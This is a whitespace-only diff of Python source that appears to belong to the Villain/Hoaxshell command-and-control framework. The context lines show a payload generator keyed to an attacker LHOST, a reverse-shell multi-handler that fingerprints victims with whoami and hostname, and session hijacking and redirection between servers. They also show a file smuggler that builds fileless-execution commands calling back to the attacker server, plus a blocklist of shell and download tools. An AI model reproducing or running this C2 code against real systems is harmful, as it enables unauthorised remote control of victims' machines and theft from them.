@@ -159,8 +159,8 @@ class Payload_Generator:
 						return
 					except:
 						print('Failed to resolve LHOST.')
-						pass		   	 
-		   	 
+						pass
+
 				payload.parameters["lhost"] = False
 				return
 
@@ -186,7 +186,7 @@ class Payload_Generator:
 				module_path = 'Core.payload_templates.' + template_file_path.replace('/', '.')
 
 				if os.path.isfile(f'{cwd}/payload_templates/{template_file_path}.py'):
-			   	 
+
 					# Remove the module from sys.modules cache
 					try: sys.modules.pop(module_path, None)
 					except:	pass
@@ -282,7 +282,7 @@ class Payload_Generator:
 				info.append('\nSupported Utilities\n-------------------\n')
 				for key in payload.attrs.keys():
 					info.append(f'{key.upper()}\n')
-	   	 
+
 			print(''.join(info) + '\n')
 
 		except Exception as e:
@@ -586,7 +586,7 @@ class Sessions_Manager:
 		sessions_data = literal_eval(past_generated_sessions)
 
 		for id in sessions_data.keys():
-	   	 
+
 			legit_session_ids[id] = sessions_data[id]
 			h = id.split('-')
 			verify.append(h[0])
@@ -877,7 +877,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		print(f'\n{activation_msg}' if stable else activation_msg)
 
 		# Check if there are any redirectors. Normally, there shouldn't be any
-		# if the session is self-owned. This function (activate_pseudo_shell_session) running  
+		# if the session is self-owned. This function (activate_pseudo_shell_session) running
 		# means the session is not occupied by a sibling.
 		if session_id in Sessions_Manager.shell_redirectors.keys():
 			print(f'{ATT} There\'s an active redirector set for this session.')
@@ -900,7 +900,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		if listener == 'hoaxshell':
 			Main_prompt.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
 		else:
-			Hoaxshell.command_pool[Hoaxshell.active_shell].append('') 
+			Hoaxshell.command_pool[Hoaxshell.active_shell].append('')
 
 		# Pseudo shell
 		try:
@@ -972,15 +972,15 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						if execution_object[0] in [os.sep, '~']:
 							file_path = os.path.expanduser(execution_object)
 							is_file = True if os.path.isfile(file_path) else False
-							
+
 							try:
 
 								if is_file:
 									# Check if file is empty
 									execution_object = get_file_contents(file_path, 'r')
-									
-									if not execution_object: 
-										raise				
+
+									if not execution_object:
+										raise
 									try:
 										if not execution_object.strip('\n\r\t '):
 											print(f'\r[{WARN}] File "{file_path}" is empty.')
@@ -989,7 +989,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 										raise
 							except:
 								print(f'\r[{ERR}] Failed to read file {file_path}.')
-								continue						
+								continue
 
 						# Check the session's stability and warn user
 						approved = True
@@ -1005,7 +1005,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						if approved:
 							# Check who is the owner of the shell session
 							session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')
-							
+
 							if session_owner_id == Core_Server.return_server_uniq_id():
 								File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self')
 							else:
@@ -1014,7 +1014,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							Hoaxshell.prompt_ready = False
 
 						else:
-							continue	
+							continue
 
 
 
@@ -1053,10 +1053,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						Core_Server.requests[user_input] = True
 
 
-					elif user_input == 'help':					
+					elif user_input == 'help':
 						if cmd_list_len == 1:
 							PrompHelp.print_main_help_msg()
-											
+
 						elif cmd_list_len == 2:
 							PrompHelp.print_detailed(cmd_list[1]) if cmd_list[1] in PrompHelp.commands.keys() \
 							else print(f'Command {cmd_list[1] if len(cmd_list[1]) <= 10 else f"{cmd_list[1][0:4]}..{cmd_list[1][-4:]}" } does not exist.')
@@ -1205,7 +1205,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			self.end_headers()
 			self.wfile.write(bytes('OK', "utf-8"))
 			Sessions_Manager.active_sessions[session_id]['execution_verified'] = True
-	   	 
+
 			try:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]
 				Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]
@@ -1215,7 +1215,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'
 				Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'
 				print_to_prompt(f'\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')
-		   	 
+
 			try:
 				Thread(target = self.monitor_shell_state, args = (session_id,), name = f'session_state_monitor_{self.client_address[0]}', daemon = True).start()
 			except:
@@ -1297,9 +1297,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						output = None
 						output = self.rfile.read(content_len)
 						output = self.cmd_output_interpreter(session_id, output, constraint_mode = Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])
-				   	 
+
 						if not isinstance(output, int):
-							
+
 							# str == User issued cmd
 							if isinstance(output, str):
 								# Dirty patch to suppress error messages when re-establishing sessions based on beacons (may occur due to bad synchronization).
@@ -1332,7 +1332,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							except: pass
 
 						del error_msg
-				   	 
+
 					finally:
 						del output
 
@@ -1377,7 +1377,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 			if Sessions_Manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
 				Hoaxshell.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
-		   	 
+
 			elif (os_type == 'Windows' and not outfile) or os_type == 'Linux':
 				Hoaxshell.command_pool[session_id].append({'data' : exit_command, 'issuer' : 'self', 'quiet' : True})
 
@@ -1549,7 +1549,7 @@ class Core_Server:
 
 					if Core_Server_Settings.insecure:
 						self.acknowledged_servers.append(address[0])
-						Core_Server.send_msg(conn, self.CONNECT_ACK)				   	 
+						Core_Server.send_msg(conn, self.CONNECT_ACK)
 
 					else:
 
@@ -1650,7 +1650,7 @@ class Core_Server:
 
 
 					elif decrypted_data[0] == 'set_redirector':
-					
+
 						session_id = decrypted_data[1]['session_id']
 						Sessions_Manager.shell_redirectors[session_id] = sibling_id
 
@@ -1662,7 +1662,7 @@ class Core_Server:
 
 
 					elif decrypted_data[0] == 'pop_redirector':
-					
+
 						session_id = decrypted_data[1]['session_id']
 						TCP_Sock_Multi_Handler.remove_redirector(session_id)
 
@@ -2450,9 +2450,9 @@ class TCP_Sock_Multi_Handler:
 				# Identify shell type (PowerShell vs cmd.exe)
 				if re.search('powershell', init_response, re.IGNORECASE) or re.search('^PS [A-Z]{1}:', prompt_val.strip('\r\n\t ')):
 					return [True, 'Windows', 'powershell.exe']
-				
+
 				return [True, 'Windows', 'cmd.exe']
-			
+
 			# Check if Windows PowerShell from prompt value
 			if re.search('^PS [A-Z]{1}:', prompt_val.strip('\r\n\t ')):
 				return [True, 'Windows', 'powershell.exe']
@@ -2461,13 +2461,13 @@ class TCP_Sock_Multi_Handler:
 			if re.search(r'(\$|\#)', response_clean):
 				if '㉿' in init_response:  # Special symbol used in zsh prompt (kali, etc.)
 					return [True, 'Linux', 'zsh']
-				return [True, 'Linux', 'unix']  
+				return [True, 'Linux', 'unix']
 
 			# Desperate attempt to specify if Win or Unix
 			conn.sendall('{}\n'.format('uname').encode('utf-8'))
 			res = self.recv_timeout(conn, quiet = True, timeout = 5)
 			if re.search('Linux', res):
-				return [True, 'Linux', 'unix'] 
+				return [True, 'Linux', 'unix']
 			elif re.search("The term 'uname' is not recognized", res):
 				return [True, 'Windows', 'powershell.exe']
 			elif re.search("'uname' is not recognized", res):
@@ -2501,10 +2501,10 @@ class TCP_Sock_Multi_Handler:
 
 			try:
 				init_res_data = self.recv_timeout(conn, quiet = True, timeout = 1.5)
-				
+
 				if init_res_data:
 					init_response += init_res_data
-			
+
 				conn.sendall('{}\n'.format('whoami').encode('utf-8'))
 				username = self.recv_timeout(conn, quiet = True, timeout = 5)
 
@@ -2543,7 +2543,7 @@ class TCP_Sock_Multi_Handler:
 			# cmd.exe
 			if shell == 'cmd.exe':
 				username = username.rsplit('\n', 1)[-1]
-			
+
 			# Check if response includes ANSI sequences (bash / zsh)
 			if os_type == 'Linux':
 				username = strip_ansi_codes(username)
@@ -2557,15 +2557,15 @@ class TCP_Sock_Multi_Handler:
 					username = username.strip()
 				else:
 					username = username.split('\n')[0].strip()
-				
+
 				try:
-					conn.sendall('{}\n'.format('hostname').encode('utf-8')) 
-					hostname_response = self.recv_timeout(conn, quiet = True, timeout = 5) 
+					conn.sendall('{}\n'.format('hostname').encode('utf-8'))
+					hostname_response = self.recv_timeout(conn, quiet = True, timeout = 5)
 
 					# Remove command echo if detected
 					if re.search ('^' + re.escape('hostname'), hostname_response) and len(hostname_response) > 8:
 						hostname_response = hostname_response[8:].strip()
-					
+
 					hostname_response = self.remove_non_print(self.clean_nc_response(hostname_response)).strip()
 					hostname = hostname_response.split('\n')
 					hostname = [h for h in hostname_response if h.strip()]
@@ -2577,14 +2577,14 @@ class TCP_Sock_Multi_Handler:
 			else:
 
 				tmp = username.split('\\')
-				try: 
+				try:
 					hostname = tmp[0].upper()
-				except: 
+				except:
 					hostname = 'Undefined'
-					
-				try: 
+
+				try:
 					username = tmp[1].strip('\n\r\t >')
-				except: 
+				except:
 					username = 'Undefined'
 
 			# Create session object
@@ -2642,13 +2642,13 @@ class TCP_Sock_Multi_Handler:
 
 		''' TCP shell commands handler '''
 		while True:
-	   	 
+
 			sessions = clone_dict_keys(Sessions_Manager.active_sessions)
 
 			if session_id not in sessions:
 				break
 			else:
-		   	 
+
 				# If pseudo shell is active OR sibling server has pseudo shell active for this session
 				issuer = 'self' if session_id == Hoaxshell.active_shell else None
 				if session_id in Sessions_Manager.shell_redirectors.keys():
@@ -2662,7 +2662,7 @@ class TCP_Sock_Multi_Handler:
 
 					cmd = Hoaxshell.command_pool[session_id].pop(0)
 					villain_issued_cmd = quiet = False
-		 
+
 					# Check command type:
 					# type str = Normal command
 					# type dict = Command issued by Villain's Utilities
@@ -2674,20 +2674,20 @@ class TCP_Sock_Multi_Handler:
 						cmd = cmd['data']
 
 					Sessions_Manager.active_sessions[session_id]['last_issued_cmd'] = cmd
-					
+
 					# If the session is powershell.exe, wrap the command in a try - catch block
 					# to ensure stderror will be delivered
 					if not villain_issued_cmd and shell == 'powershell.exe':
 						cmd = Exec_Utils.ps_try_catch_wrapper(cmd)
-			   	 
+
 					try:
 
 						# Check if socket is still alive
 						if self.is_socket_closed(conn):
 							raise ConnectionResetError
-						
+
 						conn.sendall('{}\n'.format(cmd).encode('utf-8'))
-				   	 
+
 						# Read response
 						self.recv_bulk(conn, quiet = quiet, session_id = session_id, echo = cmd_echo, issuer = issuer, \
 							timeout = TCP_Sock_Handler_Settings.recv_timeout)
@@ -2723,7 +2723,7 @@ class TCP_Sock_Multi_Handler:
 
 	def recv_bulk(self, conn, quiet = False, timeout = TCP_Sock_Handler_Settings.recv_timeout, session_id = False, \
 			exec_timeout = TCP_Sock_Handler_Settings.await_execution_timeout, issuer = 'self', echo = False):
-   	 
+
 		received_empty = 0
 
 		# sleep(0.1)
@@ -2733,16 +2733,16 @@ class TCP_Sock_Multi_Handler:
 				for i in range(3):
 					data_chunk = conn.recv(TCP_Sock_Handler_Settings.recv_timeout_buffer_size)
 					sleep(0.1)
-					
+
 					if data_chunk:
-						data.append(data_chunk)				
+						data.append(data_chunk)
 					else:
 						received_empty += 1
-				   	 
+
 						if received_empty >= 3:
 							break
 						# sleep(0.1)
-			   	 
+
 			except ConnectionResetError:
 
 				print_to_prompt(f'\r[{ERR}] Failed to recv: Connection reset by peer.') if session_id not in Sessions_Manager.sessions_graveyard \
@@ -2768,12 +2768,12 @@ class TCP_Sock_Multi_Handler:
 							output = output[len(user_issued_cmd):]
 
 					if (issuer == 'self' and Hoaxshell.active_shell == session_id) or not quiet:
-						print(output, end='', flush=True)		
+						print(output, end='', flush=True)
 					elif issuer and issuer != 'self':
 						Core_Server.send_receive_one_encrypted(issuer, [output, '', session_id, False], 'command_output', 30) if output else do_nothing()
-				
+
 				Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
-				return output 
+				return output
 
 
 
@@ -2789,16 +2789,16 @@ class TCP_Sock_Multi_Handler:
 		total_packets = 0
 
 		while True:
-	   	 
+
 			# if ((not shell_type) and (response and (time() - begin) > timeout)):
 			if ((time() - begin) > timeout):
 				Core_Server.send_receive_one_encrypted(issuer, ['', '', session_id, True], 'command_output', 30) if issuer != 'self' else do_nothing()
 				break
-	   	 
+
 			if (time() - (begin + exec_timeout) > timeout):
 				Core_Server.send_receive_one_encrypted(issuer, ['', '', session_id, True], 'command_output', 30) if issuer != 'self' else do_nothing()
 				quiet = True
-				break		   	 
+				break
 
 			try:
 				# Receive response data chunk
@@ -2817,7 +2817,7 @@ class TCP_Sock_Multi_Handler:
 						#if total_packets < 4 and re.match(re.escape(user_issued_cmd), ''.join(response)):
 							echoed_out = True
 							chunk = chunk.replace(user_issued_cmd, '').lstrip('\n\r')
-			   	 
+
 					# Output received data
 					if issuer == 'self':
 						print(chunk, end = '') if not quiet else do_nothing()
@@ -2842,7 +2842,7 @@ class TCP_Sock_Multi_Handler:
 
 			except:
 				pass
-		   	 
+
 		response = ''.join(response)
 		print('\n') if (not quiet and response.strip()) else do_nothing()
 
@@ -2857,7 +2857,7 @@ class TCP_Sock_Multi_Handler:
 
 		if len(hostname) > 255:
 			return False
-   	 
+
 		if hostname[-1] == ".":
 			hostname = hostname[:-1]
 
@@ -2929,7 +2929,7 @@ class TCP_Sock_Multi_Handler:
 			for shell,regex in re_checks.items():
 				if match_regex(regex, clean_chunk):
 					return [True, split_str_on_regex_index(regex, chunk), shell]
-	   	 
+
 			return [False]
 
 		elif shell_type in ['unix', 'zsh']:
@@ -3076,10 +3076,10 @@ class TCP_Sock_Multi_Handler:
 class Session_Defender:
 
 	is_active = True
-	windows_dangerous_commands = ["powershell.exe", "powershell", "cmd.exe", "cmd", "curl", "wget", "telnet"]	
+	windows_dangerous_commands = ["powershell.exe", "powershell", "cmd.exe", "cmd", "curl", "wget", "telnet"]
 	linux_dangerous_commands = ["bash", "sh", "zsh", "tclsh", "less", "more", "nano", "pico", "vi", "vim", \
 							 	"gedit", "atom", "emacs", "telnet"]
-	
+
 	interpreters = ['python', 'python3', 'php', 'ruby', 'irb', 'perl', 'jshell', 'node', 'ghci']
 
 
@@ -3170,7 +3170,7 @@ class Exec_Utils:
 
 	@staticmethod
 	def unix_force_sentinel_value(cmd):
-   	 
+
 		try:
 			return f'({cmd}); echo {base64.b64encode(Exec_Utils.sentinel_value.encode("utf-8")).decode("utf-8")} | base64 -d'
 		except:
@@ -3179,10 +3179,10 @@ class Exec_Utils:
 
 	@staticmethod
 	def windows_force_sentinel_value(cmd, shell_type):
-   	 
+
 		if shell_type == 'cmd.exe':
 			return f'({cmd})& echo {Exec_Utils.sentinel_value}'
-   	 
+
 		elif shell_type == 'powershell.exe':
 			return f'$({cmd}); echo {Exec_Utils.sentinel_value}'
 
@@ -3307,7 +3307,7 @@ class File_Smuggler:
 			if not src:
 				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Failed to read utility source files.')
 				return
-			
+
 			request_file_cmd = multi_set(src, {'*LHOST*' : server_ip, '*LPORT*' : port, '*TICKET*' : ticket, '*DEST*' : destination_path})
 
 			# Construct Villain issued command to request file
@@ -3343,7 +3343,7 @@ class File_Smuggler:
 			if not src:
 				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Failed to read utility source files.')
 				return
-			
+
 			exec_file_cmd = multi_set(src, {'*LHOST*' : server_ip, '*LPORT*' : port, '*TICKET*' : ticket})
 
 			# Construct Villain issued command to request file
